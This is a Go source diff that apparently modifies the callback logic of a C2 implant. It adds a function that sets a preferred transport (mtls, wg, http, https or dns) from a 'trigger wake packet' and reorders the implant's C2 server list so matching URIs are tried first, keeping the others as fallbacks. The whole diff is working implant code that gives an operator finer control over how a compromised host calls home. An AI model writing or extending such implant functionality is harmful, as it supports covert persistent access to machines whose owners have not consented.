@@ -37,7 +37,8 @@ const (
 )
 
 var (
-	dynamicC2URI = ""
+	dynamicC2URI       = ""
+	preferredTransport = ""
 )
 
 func SetC2URI(uri string) {
@@ -46,6 +47,22 @@ func SetC2URI(uri string) {
 
 func GetC2URI() string {
 	return dynamicC2URI
+}
+
+// SetPreferredTransport sets the preferred C2 transport scheme for the
+// next connection loop. When set, C2Generator will reorder the C2 list
+// to try URIs matching this scheme first. Valid values: "mtls", "wg",
+// "http", "https", "dns", or "" (no preference / try all in configured
+// order). Called from the trigger-implant loop in runner.go after
+// receiving a transport hint from the wake channel.
+func SetPreferredTransport(scheme string) {
+	preferredTransport = scheme
+}
+
+// GetPreferredTransport returns the current preferred transport scheme,
+// or "" if none is set.
+func GetPreferredTransport() string {
+	return preferredTransport
 }
 
 // C2Generator - Creates a stream of C2 URLs based on a connection strategy
@@ -71,6 +88,28 @@ func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 		// {{end}} - range
 	}
 
+	// If a preferred transport is set (e.g. from a trigger wake packet),
+	// reorder c2Servers so entries matching the preferred scheme come first.
+	// This gives the operator control over which C2 the implant connects to
+	// after wake, without discarding fallback options.
+	if pref := GetPreferredTransport(); pref != "" {
+		var preferred, rest []func() string
+		for _, fn := range c2Servers {
+			u, err := url.Parse(fn())
+			if err == nil && matchesTransportScheme(u.Scheme, pref) {
+				preferred = append(preferred, fn)
+			} else {
+				rest = append(rest, fn)
+			}
+		}
+		if len(preferred) > 0 {
+			c2Servers = append(preferred, rest...)
+			// {{if .Config.Debug}}
+			log.Printf("Reordered C2 list: preferred transport %q (%d match, %d fallback)", pref, len(preferred), len(rest))
+			// {{end}}
+		}
+	}
+
 	generator := make(chan *url.URL)
 	go func() {
 		defer close(generator)
@@ -91,7 +130,7 @@ func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 				next = c2Servers[c2Counter%uint(len(c2Servers))]()
 			}
 
-			// check if reconfig used to set a new C2-URI 
+			// check if reconfig used to set a new C2-URI
 			if dynamic := GetC2URI(); dynamic != "" {
 				next = dynamic
 			}
@@ -219,4 +258,18 @@ func GetMaxConnectionErrors() int {
 		return 1000
 	}
 	return maxConnectionErrors
+}
+
+// matchesTransportScheme checks whether a C2 URI scheme matches the
+// operator's preferred transport hint. Handles the http/https overlap:
+// if the operator asks for "http", both "http" and "https" match.
+func matchesTransportScheme(uriScheme, pref string) bool {
+	if uriScheme == pref {
+		return true
+	}
+	// "http" preference should match both http and https URIs.
+	if pref == "http" && uriScheme == "https" {
+		return true
+	}
+	return false
 }
